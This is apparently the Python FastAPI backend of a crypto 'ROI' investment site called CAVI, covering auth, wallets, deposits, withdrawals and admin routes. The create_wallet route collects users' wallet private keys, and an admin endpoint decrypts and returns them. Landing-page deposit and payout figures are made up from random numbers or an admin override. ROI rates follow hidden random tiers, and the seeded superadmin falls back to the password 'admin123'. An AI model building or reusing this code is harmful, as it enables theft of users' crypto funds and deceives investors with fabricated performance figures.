from dotenv import load_dotenv
from pathlib import Path
import os

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

import asyncio
import logging
import random
import secrets
import uuid
from datetime import datetime, timezone, timedelta, time as dtime

import bcrypt
import jwt
import httpx
import base58
import nacl.signing
import nacl.exceptions
from eth_account import Account
from eth_account.messages import encode_defunct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from fastapi import FastAPI, APIRouter, Depends, HTTPException, Request, status
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from pydantic import BaseModel, Field, EmailStr

# ----------------------------------------------------------------------------
# Configuration & DB
# ----------------------------------------------------------------------------
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_SECRET = os.environ['JWT_SECRET']
JWT_ALGORITHM = "HS256"
ENCRYPTION_KEY = bytes.fromhex(os.environ['ENCRYPTION_KEY'])  # 32 bytes -> AES-256
SUPPORT_EMAIL = os.environ.get('SUPPORT_EMAIL', 'support@cavi.solutions')
MAX_DEPOSITS = 3  # demo deposit attempts before security flag
MAX_DISPLAY_DEPOSIT = 4_200_000  # cap for landing-page total deposit stat

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("cavi")

app = FastAPI(title="CAVI API")
api = APIRouter(prefix="/api")

# ----------------------------------------------------------------------------
# Security helpers
# ----------------------------------------------------------------------------
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")

def verify_password(plain: str, hashed: str) -> bool:
    try:
        return bcrypt.checkpw(plain.encode("utf-8"), hashed.encode("utf-8"))
    except Exception:
        return False

def create_access_token(user_id: str) -> str:
    payload = {
        "sub": user_id,
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(days=7),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def encrypt_private_key(plaintext: str) -> str:
    aes = AESGCM(ENCRYPTION_KEY)
    nonce = os.urandom(12)
    ct = aes.encrypt(nonce, plaintext.encode("utf-8"), None)
    return (nonce + ct).hex()

def decrypt_private_key(token_hex: str) -> str:
    raw = bytes.fromhex(token_hex)
    nonce, ct = raw[:12], raw[12:]
    aes = AESGCM(ENCRYPTION_KEY)
    return aes.decrypt(nonce, ct, None).decode("utf-8")

def public_user(doc: dict) -> dict:
    if not doc:
        return doc
    doc = dict(doc)
    doc.pop("_id", None)
    doc.pop("password", None)
    return doc

# ----------------------------------------------------------------------------
# Auth dependencies
# ----------------------------------------------------------------------------
async def get_current_user(request: Request) -> dict:
    auth_header = request.headers.get("Authorization", "")
    token = auth_header[7:] if auth_header.startswith("Bearer ") else None
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
    user = await db.users.find_one({"id": payload["sub"]}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return user

async def require_admin(user: dict = Depends(get_current_user)) -> dict:
    if user.get("role") not in ("admin", "superadmin"):
        raise HTTPException(status_code=403, detail="Admin access required")
    return user

async def require_superadmin(user: dict = Depends(get_current_user)) -> dict:
    if user.get("role") != "superadmin":
        raise HTTPException(status_code=403, detail="Superadmin access required")
    return user

async def write_audit(admin_id: str, action: str, target_id: str, description: str):
    await db.audit.insert_one({
        "id": str(uuid.uuid4()),
        "adminId": admin_id,
        "action": action,
        "targetId": target_id,
        "description": description,
        "createdAt": datetime.now(timezone.utc).isoformat(),
    })

# ----------------------------------------------------------------------------
# Time / window helpers  (PKT = UTC+5)
# ----------------------------------------------------------------------------
PKT = timezone(timedelta(hours=5))

def now_pkt() -> datetime:
    return datetime.now(PKT)

def in_penalty_window() -> bool:
    # Penalty window: 5:00 AM - 6:00 AM PKT
    h = now_pkt().hour
    return h == 5

# ----------------------------------------------------------------------------
# ROI rate engine (hidden probability tiers)
# ----------------------------------------------------------------------------
def generate_roi_rate() -> float:
    r = random.random()
    if r < 0.80:
        rate = random.uniform(0.800, 0.990)   # 80% chance: 0.8% - 0.99%
    elif r < 0.95:
        rate = random.uniform(1.000, 1.300)   # 15% chance: 1.0% - 1.3%
    else:
        rate = random.uniform(1.301, 2.000)   # 5% chance: 1.31% - 2.0%
    return round(rate, 3)

async def get_settings() -> dict:
    doc = await db.settings.find_one({"key": "global"}, {"_id": 0})
    if not doc:
        doc = {
            "key": "global",
            "value": {
                "globalRoiPaused": False,
                "penaltyRate": 0.005,
                "roiRunHourUtc": 1,
                "rateTiers": {"low": [0.800, 0.990], "mid": [1.000, 1.300], "high": [1.301, 2.000]},
                "displayTotalDeposit": None,
            },
        }
        await db.settings.insert_one(dict(doc))
    return doc["value"]

async def compute_public_stats() -> dict:
    """Landing-page platform stats. Capped at MAX_DISPLAY_DEPOSIT. ROI paid is always
    a fraction of deposits (never exceeds it). Wallets derive from deposits. If an admin
    sets displayTotalDeposit, everything derives from that; otherwise it rotates daily."""
    settings = await get_settings()
    override = settings.get("displayTotalDeposit")
    day = int(datetime.now(timezone.utc).timestamp() // 86400)
    rng = random.Random(day)  # deterministic per day; does NOT touch global RNG used for ROI
    if override is not None:
        deposited = min(float(override), MAX_DISPLAY_DEPOSIT)
        roi_paid = round(deposited * 0.34, 2)
        wallets = int(deposited / 400) if deposited > 0 else 0
    else:
        deposited = round(min(3_600_000 + rng.random() * 600_000, MAX_DISPLAY_DEPOSIT), 2)
        roi_paid = round(deposited * (0.30 + rng.random() * 0.08), 2)  # 30-38%, always < deposit
        wallets = int(deposited / (360 + rng.random() * 120))
    return {"deposited": deposited, "roiPaid": roi_paid, "wallets": wallets, "max": MAX_DISPLAY_DEPOSIT}

# ----------------------------------------------------------------------------
# Pydantic request models
# ----------------------------------------------------------------------------
class RegisterReq(BaseModel):
    username: str
    email: EmailStr
    password: str

class LoginReq(BaseModel):
    email: EmailStr
    password: str

class WalletNonceReq(BaseModel):
    address: str
    chain: str  # 'evm' or 'solana'

class WalletVerifyReq(BaseModel):
    address: str
    message: str
    signature: str
    chain: str
    username: str | None = None

class UpdateUsernameReq(BaseModel):
    username: str

class CreateWalletReq(BaseModel):
    network: str  # ETH/SOL/BNB/TRC20
    address: str
    privateKey: str
    label: str | None = None

class DepositReq(BaseModel):
    amount: float

class WithdrawalReq(BaseModel):
    amount: float
    network: str
    destinationAddress: str

class ToggleReq(BaseModel):
    value: bool

class RoleReq(BaseModel):
    email: EmailStr
    role: str  # user/admin/superadmin

class WithdrawalActionReq(BaseModel):
    status: str  # approved/rejected

class GlobalRoiReq(BaseModel):
    paused: bool

class LandingStatsReq(BaseModel):
    totalDeposit: float | None = None  # None => auto (daily rotating)

# ----------------------------------------------------------------------------
# Helpers to assemble user financials
# ----------------------------------------------------------------------------
async def user_financials(user_id: str) -> dict:
    roi_agg = await db.roi.aggregate(
        [{"$match": {"userId": user_id}}, {"$group": {"_id": None, "t": {"$sum": "$amount"}}}]).to_list(1)
    roi_total = roi_agg[0]["t"] if roi_agg else 0.0
    wd_agg = await db.withdrawals.aggregate(
        [{"$match": {"userId": user_id, "status": "approved"}},
         {"$group": {"_id": None, "t": {"$sum": "$netAmount"}}}]).to_list(1)
    wd_total = wd_agg[0]["t"] if wd_agg else 0.0
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    deposit_base = user.get("depositBase", 0) if user else 0
    balance = deposit_base + roi_total - wd_total
    return {"depositBase": deposit_base, "roiEarned": round(roi_total, 4),
            "withdrawn": round(wd_total, 4), "balance": round(balance, 4)}

# ----------------------------------------------------------------------------
# AUTH ROUTES
# ----------------------------------------------------------------------------
@api.post("/auth/register")
async def register(body: RegisterReq):
    email = body.email.lower()
    if await db.users.find_one({"email": email}):
        raise HTTPException(status_code=400, detail="Email already registered")
    uid = str(uuid.uuid4())
    doc = {
        "id": uid, "username": body.username, "email": email,
        "password": hash_password(body.password), "loginType": "email",
        "walletAddress": None, "role": "user", "roiAllowed": True,
        "wdAllowed": True, "depositBase": 0.0, "depositCount": 0, "securityFlag": False,
        "createdAt": datetime.now(timezone.utc).isoformat(),
    }
    await db.users.insert_one(dict(doc))
    return {"token": create_access_token(uid), "user": public_user(doc)}

@api.post("/auth/login")
async def login(body: LoginReq):
    email = body.email.lower()
    user = await db.users.find_one({"email": email})
    if not user or not user.get("password") or not verify_password(body.password, user["password"]):
        raise HTTPException(status_code=401, detail="Invalid email or password")
    return {"token": create_access_token(user["id"]), "user": public_user(user)}

@api.post("/auth/wallet-nonce")
async def wallet_nonce(body: WalletNonceReq):
    nonce = secrets.token_urlsafe(16)
    now = datetime.now(timezone.utc)
    message = (
        f"Welcome to CAVI!\n\nSign this message to verify ownership of your wallet and log in.\n\n"
        f"Wallet: {body.address}\nNonce: {nonce}\nIssued: {now.isoformat()}"
    )
    await db.auth_nonces.insert_one({
        "id": str(uuid.uuid4()), "address": body.address, "chain": body.chain,
        "message": message, "createdAt": now, "expiresAt": now + timedelta(minutes=10),
        "consumed": False,
    })
    return {"message": message}

@api.post("/auth/wallet-login")
async def wallet_login(body: WalletVerifyReq):
    nonce_doc = await db.auth_nonces.find_one(
        {"address": body.address, "chain": body.chain, "message": body.message, "consumed": False})
    if not nonce_doc:
        raise HTTPException(status_code=400, detail="Invalid or expired challenge")
    expires_at = nonce_doc["expiresAt"]
    if expires_at.tzinfo is None:
        expires_at = expires_at.replace(tzinfo=timezone.utc)
    if expires_at < datetime.now(timezone.utc):
        raise HTTPException(status_code=400, detail="Challenge expired")

    ok = False
    if body.chain == "evm":
        try:
            recovered = Account.recover_message(encode_defunct(text=body.message), signature=body.signature)
            ok = recovered.lower() == body.address.lower()
        except Exception as e:
            logger.warning(f"EVM verify failed: {e}")
    elif body.chain == "solana":
        try:
            pub = base58.b58decode(body.address)
            sig = base58.b58decode(body.signature)
            nacl.signing.VerifyKey(pub).verify(body.message.encode("utf-8"), sig)
            ok = True
        except Exception as e:
            logger.warning(f"Solana verify failed: {e}")
    if not ok:
        raise HTTPException(status_code=400, detail="Signature verification failed")

    await db.auth_nonces.update_one({"_id": nonce_doc["_id"]}, {"$set": {"consumed": True}})

    user = await db.users.find_one({"walletAddress": body.address})
    if not user:
        uid = str(uuid.uuid4())
        username = body.username or f"{body.address[:6]}...{body.address[-4:]}"
        user = {
            "id": uid, "username": username, "email": None, "password": None,
            "loginType": "wallet", "walletAddress": body.address, "role": "user",
            "roiAllowed": True, "wdAllowed": True, "depositBase": 0.0,
            "depositCount": 0, "securityFlag": False,
            "createdAt": datetime.now(timezone.utc).isoformat(),
        }
        await db.users.insert_one(dict(user))
    return {"token": create_access_token(user["id"]), "user": public_user(user)}

@api.get("/auth/me")
async def me(user: dict = Depends(get_current_user)):
    fin = await user_financials(user["id"])
    remaining = max(0, MAX_DEPOSITS - user.get("depositCount", 0))
    return {"user": public_user(user), "financials": fin,
            "supportEmail": SUPPORT_EMAIL, "depositAttemptsRemaining": remaining}

@api.patch("/auth/update-username")
async def update_username(body: UpdateUsernameReq, user: dict = Depends(get_current_user)):
    await db.users.update_one({"id": user["id"]}, {"$set": {"username": body.username}})
    updated = await db.users.find_one({"id": user["id"]}, {"_id": 0})
    return {"user": public_user(updated)}

# ----------------------------------------------------------------------------
# WALLET ROUTES
# ----------------------------------------------------------------------------
def deposit_roi_start_date() -> str:
    """A deposit made 05:00-05:59 AM PKT activates for the SAME day's 6 AM cycle;
    any other time activates at the NEXT day's 6 AM cycle. Returns PKT date ISO."""
    pkt = now_pkt()
    if pkt.hour == 5:
        start = pkt.date()
    else:
        start = (pkt + timedelta(days=1)).date()
    return start.isoformat()

@api.post("/wallets")
async def create_wallet(body: CreateWalletReq, user: dict = Depends(get_current_user)):
    existing = await db.wallets.find_one({"userId": user["id"], "network": body.network})
    if existing:
        raise HTTPException(status_code=400,
                            detail=f"You already have a {body.network} wallet. Only one wallet per network is allowed.")
    wallet_id = str(uuid.uuid4())
    wallet = {
        "id": wallet_id, "userId": user["id"], "network": body.network,
        "address": body.address, "label": body.label or f"{body.network} Wallet",
        "depositAmount": 0.0, "usdtBalance": 0.0, "usdcBalance": 0.0,
        "createdAt": datetime.now(timezone.utc).isoformat(),
    }
    await db.wallets.insert_one(dict(wallet))
    # store the private key ENCRYPTED, once. Never returned to user again.
    await db.wallet_keys.insert_one({
        "id": str(uuid.uuid4()), "walletId": wallet_id, "userId": user["id"],
        "network": body.network, "encryptedPrivateKey": encrypt_private_key(body.privateKey),
        "keyViewed": False, "keyViewedAt": None,
    })
    wallet.pop("_id", None)
    return {"wallet": wallet}

@api.get("/wallets")
async def list_wallets(user: dict = Depends(get_current_user)):
    wallets = await db.wallets.find({"userId": user["id"]}, {"_id": 0}).to_list(200)
    return {"wallets": wallets}

@api.post("/wallets/{wallet_id}/deposit")
async def simulate_deposit(wallet_id: str, body: DepositReq, user: dict = Depends(get_current_user)):
    if user.get("securityFlag"):
        raise HTTPException(status_code=403,
            detail=f"Your account is under security review and deposits are blocked. Please contact the admin at {SUPPORT_EMAIL}.")
    wallet = await db.wallets.find_one({"id": wallet_id, "userId": user["id"]})
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet not found")
    if body.amount <= 0:
        raise HTTPException(status_code=400, detail="Amount must be positive")

    count = user.get("depositCount", 0)
    if count >= MAX_DEPOSITS:
        # 4th attempt: flag the user as a security threat
        await db.users.update_one({"id": user["id"]}, {"$set": {
            "securityFlag": True, "flaggedAt": datetime.now(timezone.utc).isoformat(),
            "flagReason": f"Exceeded the allowed deposit attempts ({MAX_DEPOSITS})"}})
        await write_audit("system", "security_flag", user["id"],
                          f"User {user.get('username')} flagged: exceeded deposit attempts")
        raise HTTPException(status_code=403,
            detail=f"You have used all {MAX_DEPOSITS} deposit attempts. Your account has been flagged for review. Please contact the admin at {SUPPORT_EMAIL}.")

    start_date = deposit_roi_start_date()
    await db.deposits.insert_one({
        "id": str(uuid.uuid4()), "userId": user["id"], "walletId": wallet_id,
        "network": wallet["network"], "amount": body.amount,
        "depositedAt": datetime.now(timezone.utc).isoformat(),
        "roiStartDate": start_date, "status": "confirmed",
    })
    await db.wallets.update_one({"id": wallet_id}, {"$inc": {"depositAmount": body.amount, "usdtBalance": body.amount}})
    # deposit base only ever increases
    await db.users.update_one({"id": user["id"]}, {"$inc": {"depositBase": body.amount, "depositCount": 1}})
    fin = await user_financials(user["id"])
    remaining = max(0, MAX_DEPOSITS - (count + 1))
    return {"financials": fin, "roiStartDate": start_date, "attemptsRemaining": remaining}

@api.get("/wallets/{wallet_id}/deposits")
async def wallet_deposits(wallet_id: str, user: dict = Depends(get_current_user)):
    wallet = await db.wallets.find_one({"id": wallet_id, "userId": user["id"]}, {"_id": 0})
    if not wallet:
        raise HTTPException(status_code=404, detail="Wallet not found")
    deposits = await db.deposits.find({"walletId": wallet_id}, {"_id": 0}).sort("depositedAt", -1).to_list(200)
    today = now_pkt().date().isoformat()
    for d in deposits:
        d["roiActive"] = d["roiStartDate"] <= today
    return {"wallet": wallet, "deposits": deposits,
            "total": round(sum(d["amount"] for d in deposits), 4)}

# ----------------------------------------------------------------------------
# ROI ROUTES
# ----------------------------------------------------------------------------
@api.get("/roi")
async def my_roi(user: dict = Depends(get_current_user)):
    fin = await user_financials(user["id"])
    if fin["depositBase"] <= 0:
        return {"hasDeposits": False, "depositBase": 0, "today": None, "history": [], "totalRoi": 0}
    history = await db.roi.find({"userId": user["id"]}, {"_id": 0}).sort("cycleDate", -1).to_list(60)
    today_str = now_pkt().date().isoformat()
    today = next((r for r in history if r.get("cycleDate") == today_str), None)
    return {
        "hasDeposits": True, "depositBase": fin["depositBase"],
        "today": today, "history": list(reversed(history[:30])),
        "totalRoi": fin["roiEarned"],
    }

# ----------------------------------------------------------------------------
# WITHDRAWAL ROUTES
# ----------------------------------------------------------------------------
@api.post("/withdrawals")
async def request_withdrawal(body: WithdrawalReq, user: dict = Depends(get_current_user)):
    if not user.get("wdAllowed", True):
        raise HTTPException(status_code=403, detail="Withdrawals are disabled for your account")
    fin = await user_financials(user["id"])
    if body.amount <= 0:
        raise HTTPException(status_code=400, detail="Amount must be positive")
    if body.amount > fin["balance"]:
        raise HTTPException(status_code=400, detail="Insufficient balance")
    settings = await get_settings()
    penalty_rate = settings.get("penaltyRate", 0.005)
    penalty = round(body.amount * penalty_rate, 4) if in_penalty_window() else 0.0
    net = round(body.amount - penalty, 4)
    doc = {
        "id": str(uuid.uuid4()), "userId": user["id"], "amount": body.amount,
        "network": body.network, "destinationAddress": body.destinationAddress,
        "penaltyAmount": penalty, "netAmount": net, "status": "pending",
        "requestedAt": datetime.now(timezone.utc).isoformat(),
    }
    await db.withdrawals.insert_one(dict(doc))
    doc.pop("_id", None)
    return {"withdrawal": doc, "penaltyApplied": penalty > 0}

@api.get("/withdrawals")
async def my_withdrawals(user: dict = Depends(get_current_user)):
    items = await db.withdrawals.find({"userId": user["id"]}, {"_id": 0}).sort("requestedAt", -1).to_list(100)
    return {"withdrawals": items, "penaltyWindow": in_penalty_window()}

# ----------------------------------------------------------------------------
# PRICES (CoinGecko, in-memory cached)
# ----------------------------------------------------------------------------
_price_cache = {"ts": 0, "data": []}
COIN_MAP = [
    ("bitcoin", "BTC"), ("ethereum", "ETH"), ("solana", "SOL"),
    ("binancecoin", "BNB"), ("tron", "TRX"), ("tether", "USDT"), ("usd-coin", "USDC"),
]

@api.get("/prices")
async def prices():
    now = datetime.now(timezone.utc).timestamp()
    if now - _price_cache["ts"] < 60 and _price_cache["data"]:
        return {"prices": _price_cache["data"], "cached": True}
    ids = ",".join(c[0] for c in COIN_MAP)
    url = f"https://api.coingecko.com/api/v3/simple/price?ids={ids}&vs_currencies=usd&include_24hr_change=true"
    try:
        async with httpx.AsyncClient(timeout=10) as hc:
            resp = await hc.get(url)
            data = resp.json()
        out = []
        for cid, sym in COIN_MAP:
            d = data.get(cid, {})
            out.append({"symbol": sym, "price": d.get("usd", 0), "change24h": round(d.get("usd_24h_change", 0) or 0, 2)})
        _price_cache["ts"] = now
        _price_cache["data"] = out
        return {"prices": out, "cached": False}
    except Exception as e:
        logger.warning(f"price fetch failed: {e}")
        if _price_cache["data"]:
            return {"prices": _price_cache["data"], "cached": True}
        fallback = [{"symbol": s, "price": 0, "change24h": 0} for _, s in COIN_MAP]
        return {"prices": fallback, "cached": False}

# ----------------------------------------------------------------------------
# ADMIN ROUTES
# ----------------------------------------------------------------------------
@api.get("/stats/public")
async def stats_public():
    return await compute_public_stats()

@api.get("/admin/stats")
async def admin_stats(admin: dict = Depends(require_admin)):
    total_users = await db.users.count_documents({})
    agg = await db.users.aggregate([{"$group": {"_id": None, "t": {"$sum": "$depositBase"}}}]).to_list(1)
    total_deposited = round(agg[0]["t"], 2) if agg else 0
    roi_agg = await db.roi.aggregate([{"$group": {"_id": None, "t": {"$sum": "$amount"}}}]).to_list(1)
    total_roi = round(roi_agg[0]["t"], 2) if roi_agg else 0
    pen_agg = await db.withdrawals.aggregate([
        {"$match": {"status": "approved"}}, {"$group": {"_id": None, "t": {"$sum": "$penaltyAmount"}}}]).to_list(1)
    penalties = round(pen_agg[0]["t"], 2) if pen_agg else 0
    pending = await db.withdrawals.count_documents({"status": "pending"})
    paused = await db.users.count_documents({"roiAllowed": False})
    settings = await get_settings()
    audit = await db.audit.find({}, {"_id": 0}).sort("createdAt", -1).to_list(15)
    return {
        "totalUsers": total_users, "totalDeposited": total_deposited,
        "totalRoiPaid": total_roi, "penalties": penalties,
        "pendingWithdrawals": pending, "pausedUsers": paused,
        "globalRoiPaused": settings.get("globalRoiPaused", False),
        "recentActivity": audit,
    }

@api.get("/admin/users")
async def admin_users(admin: dict = Depends(require_admin)):
    users = await db.users.find({}, {"_id": 0, "password": 0}).sort("createdAt", -1).to_list(1000)
    roi_map = {}
    async for r in db.roi.aggregate([{"$group": {"_id": "$userId", "t": {"$sum": "$amount"}}}]):
        roi_map[r["_id"]] = r["t"]
    wd_map = {}
    async for w in db.withdrawals.aggregate(
        [{"$match": {"status": "approved"}}, {"$group": {"_id": "$userId", "t": {"$sum": "$netAmount"}}}]):
        wd_map[w["_id"]] = w["t"]
    for u in users:
        base = u.get("depositBase", 0)
        roi_t = round(roi_map.get(u["id"], 0), 4)
        wd_t = round(wd_map.get(u["id"], 0), 4)
        u["financials"] = {"depositBase": base, "roiEarned": roi_t,
                           "withdrawn": wd_t, "balance": round(base + roi_t - wd_t, 4)}
    return {"users": users}

@api.patch("/admin/users/{user_id}/roi")
async def admin_toggle_roi(user_id: str, body: ToggleReq, admin: dict = Depends(require_admin)):
    await db.users.update_one({"id": user_id}, {"$set": {"roiAllowed": body.value}})
    await write_audit(admin["id"], "toggle_roi", user_id, f"Set roiAllowed={body.value}")
    return {"ok": True}

@api.patch("/admin/users/{user_id}/wd")
async def admin_toggle_wd(user_id: str, body: ToggleReq, admin: dict = Depends(require_admin)):
    await db.users.update_one({"id": user_id}, {"$set": {"wdAllowed": body.value}})
    await write_audit(admin["id"], "toggle_wd", user_id, f"Set wdAllowed={body.value}")
    return {"ok": True}

@api.patch("/admin/users/role")
async def admin_set_role(body: RoleReq, admin: dict = Depends(require_superadmin)):
    if body.role not in ("user", "admin", "superadmin"):
        raise HTTPException(status_code=400, detail="Invalid role")
    target = await db.users.find_one({"email": body.email.lower()})
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    await db.users.update_one({"id": target["id"]}, {"$set": {"role": body.role}})
    await write_audit(admin["id"], "set_role", target["id"], f"Set role={body.role} for {body.email}")
    return {"ok": True}

@api.get("/admin/fraud")
async def admin_fraud(admin: dict = Depends(require_admin)):
    flagged = await db.users.find({"securityFlag": True}, {"_id": 0, "password": 0}).to_list(1000)
    for u in flagged:
        u["financials"] = await user_financials(u["id"])
    return {"flagged": flagged}

@api.patch("/admin/users/{user_id}/clear-flag")
async def admin_clear_flag(user_id: str, admin: dict = Depends(require_admin)):
    target = await db.users.find_one({"id": user_id})
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    await db.users.update_one({"id": user_id}, {"$set": {
        "securityFlag": False, "depositCount": 0, "flagReason": None}})
    await write_audit(admin["id"], "clear_security_flag", user_id,
                      f"Cleared security flag for {target.get('username')} (deposit attempts reset)")
    return {"ok": True}

@api.get("/admin/wallets")
async def admin_wallets(admin: dict = Depends(require_admin)):
    wallets = await db.wallets.find({}, {"_id": 0}).sort("createdAt", -1).to_list(1000)
    keys = await db.wallet_keys.find({}, {"_id": 0, "encryptedPrivateKey": 0}).to_list(1000)
    key_map = {k["walletId"]: k for k in keys}
    user_ids = list({w["userId"] for w in wallets})
    users = await db.users.find({"id": {"$in": user_ids}}, {"_id": 0}).to_list(len(user_ids) or 1)
    user_map = {u["id"]: u for u in users}
    for w in wallets:
        u = user_map.get(w["userId"])
        w["ownerUsername"] = u.get("username") if u else "—"
        w["ownerEmail"] = u.get("email") if u else None
        w["keyId"] = key_map.get(w["id"], {}).get("id")
        w["keyViewed"] = key_map.get(w["id"], {}).get("keyViewed", False)
    return {"wallets": wallets}

@api.get("/admin/wallets/{key_id}/key")
async def admin_view_key(key_id: str, admin: dict = Depends(require_admin)):
    key_doc = await db.wallet_keys.find_one({"id": key_id})
    if not key_doc:
        raise HTTPException(status_code=404, detail="Key not found")
    plaintext = decrypt_private_key(key_doc["encryptedPrivateKey"])
    await db.wallet_keys.update_one({"id": key_id}, {"$set": {
        "keyViewed": True, "keyViewedAt": datetime.now(timezone.utc).isoformat()}})
    await write_audit(admin["id"], "view_private_key", key_doc["walletId"],
                      f"Decrypted private key for wallet {key_doc['walletId']}")
    return {"privateKey": plaintext, "network": key_doc["network"]}

@api.get("/admin/withdrawals")
async def admin_withdrawals(admin: dict = Depends(require_admin)):
    items = await db.withdrawals.find({}, {"_id": 0}).sort("requestedAt", -1).to_list(1000)
    user_ids = list({w["userId"] for w in items})
    users = await db.users.find({"id": {"$in": user_ids}}, {"_id": 0}).to_list(len(user_ids) or 1)
    user_map = {u["id"]: u for u in users}
    for w in items:
        u = user_map.get(w["userId"])
        w["username"] = u.get("username") if u else "—"
        w["wdAllowed"] = u.get("wdAllowed", True) if u else True
    return {"withdrawals": items}

@api.patch("/admin/withdrawals/{wd_id}")
async def admin_action_withdrawal(wd_id: str, body: WithdrawalActionReq, admin: dict = Depends(require_admin)):
    if body.status not in ("approved", "rejected"):
        raise HTTPException(status_code=400, detail="Invalid status")
    wd = await db.withdrawals.find_one({"id": wd_id})
    if not wd:
        raise HTTPException(status_code=404, detail="Withdrawal not found")
    await db.withdrawals.update_one({"id": wd_id}, {"$set": {"status": body.status}})
    await write_audit(admin["id"], f"withdrawal_{body.status}", wd_id,
                      f"Withdrawal {wd['amount']} {body.status}")
    return {"ok": True}

@api.post("/admin/roi/run-cycle")
async def admin_run_cycle(admin: dict = Depends(require_admin)):
    count = await run_roi_cycle(manual=True)
    await write_audit(admin["id"], "run_roi_cycle", "system", f"Manual ROI cycle generated {count} records")
    return {"ok": True, "generated": count}

@api.patch("/admin/settings/global-roi")
async def admin_global_roi(body: GlobalRoiReq, admin: dict = Depends(require_admin)):
    settings = await get_settings()
    settings["globalRoiPaused"] = body.paused
    await db.settings.update_one({"key": "global"}, {"$set": {"value": settings}})
    await write_audit(admin["id"], "global_roi_toggle", "system", f"Global ROI paused={body.paused}")
    return {"ok": True}

@api.get("/admin/settings")
async def admin_get_settings(admin: dict = Depends(require_admin)):
    return {"settings": await get_settings()}

@api.patch("/admin/settings/landing-stats")
async def admin_landing_stats(body: LandingStatsReq, admin: dict = Depends(require_admin)):
    settings = await get_settings()
    if body.totalDeposit is None:
        val = None
    else:
        val = max(0.0, min(float(body.totalDeposit), MAX_DISPLAY_DEPOSIT))
    settings["displayTotalDeposit"] = val
    await db.settings.update_one({"key": "global"}, {"$set": {"value": settings}})
    await write_audit(admin["id"], "set_landing_deposit", "system",
                      f"Landing total deposit display set to {'AUTO' if val is None else val}")
    return {"ok": True, "stats": await compute_public_stats()}

@api.get("/admin/audit")
async def admin_audit(admin: dict = Depends(require_admin)):
    items = await db.audit.find({}, {"_id": 0}).sort("createdAt", -1).to_list(200)
    admin_ids = list({a["adminId"] for a in items})
    admins = await db.users.find({"id": {"$in": admin_ids}}, {"_id": 0}).to_list(len(admin_ids) or 1)
    admin_map = {u["id"]: u for u in admins}
    for a in items:
        adm = admin_map.get(a["adminId"])
        a["adminName"] = adm.get("username") if adm else a["adminId"]
    return {"audit": items}

# ----------------------------------------------------------------------------
# ROI CYCLE LOGIC + SCHEDULER
# ----------------------------------------------------------------------------
async def run_roi_cycle(manual: bool = False) -> int:
    settings = await get_settings()
    if settings.get("globalRoiPaused"):
        logger.info("ROI cycle skipped: globally paused")
        return 0
    cycle_date = now_pkt().date().isoformat()  # PKT date (6 AM PKT cycle)
    generated = 0
    existing_rows = await db.roi.find({"cycleDate": cycle_date}, {"_id": 0, "userId": 1}).to_list(100000)
    already = {r["userId"] for r in existing_rows}
    # Eligible (activated) deposit base per user = deposits whose roiStartDate has arrived
    active_base = {}
    async for d in db.deposits.aggregate([
        {"$match": {"roiStartDate": {"$lte": cycle_date}}},
        {"$group": {"_id": "$userId", "t": {"$sum": "$amount"}}},
    ]):
        active_base[d["_id"]] = d["t"]
    users = await db.users.find({"roiAllowed": True, "securityFlag": {"$ne": True}}, {"_id": 0}).to_list(100000)
    new_records = []
    for u in users:
        if u["id"] in already:
            continue
        deposit_base = round(active_base.get(u["id"], 0), 4)
        if deposit_base <= 0:
            continue
        rate = generate_roi_rate()
        amount = round(deposit_base * rate / 100.0, 4)
        new_records.append({
            "id": str(uuid.uuid4()), "userId": u["id"], "depositBase": deposit_base,
            "rate": rate, "amount": amount, "cycleDate": cycle_date,
            "createdAt": datetime.now(timezone.utc).isoformat(),
        })
        generated += 1
    if new_records:
        await db.roi.insert_many(new_records)
    logger.info(f"ROI cycle complete: {generated} records for {cycle_date} (manual={manual})")
    return generated

async def roi_scheduler():
    while True:
        now = datetime.now(timezone.utc)
        settings = await get_settings()
        run_hour = settings.get("roiRunHourUtc", 1)
        target = now.replace(hour=run_hour, minute=0, second=0, microsecond=0)
        if target <= now:
            target += timedelta(days=1)
        wait = (target - now).total_seconds()
        logger.info(f"ROI scheduler sleeping {int(wait)}s until {target.isoformat()}")
        await asyncio.sleep(wait)
        try:
            await run_roi_cycle()
        except Exception as e:
            logger.error(f"ROI cycle error: {e}")

# ----------------------------------------------------------------------------
# STARTUP
# ----------------------------------------------------------------------------
async def seed_admin():
    admin_email = os.environ.get("ADMIN_EMAIL", "superadmin@cavi.io").lower()
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if not existing:
        await db.users.insert_one({
            "id": str(uuid.uuid4()), "username": "Super Admin", "email": admin_email,
            "password": hash_password(admin_password), "loginType": "email",
            "walletAddress": None, "role": "superadmin", "roiAllowed": True,
            "wdAllowed": True, "depositBase": 0.0,
            "createdAt": datetime.now(timezone.utc).isoformat(),
        })
        logger.info(f"Seeded superadmin: {admin_email}")
    else:
        update = {"role": "superadmin"}
        if not verify_password(admin_password, existing.get("password", "")):
            update["password"] = hash_password(admin_password)
        await db.users.update_one({"email": admin_email}, {"$set": update})

@app.on_event("startup")
async def startup():
    await db.users.create_index("email", sparse=True)
    await db.users.create_index("id", unique=True)
    await db.users.create_index("walletAddress", sparse=True)
    await db.auth_nonces.create_index("expiresAt", expireAfterSeconds=0)
    await seed_admin()
    await get_settings()
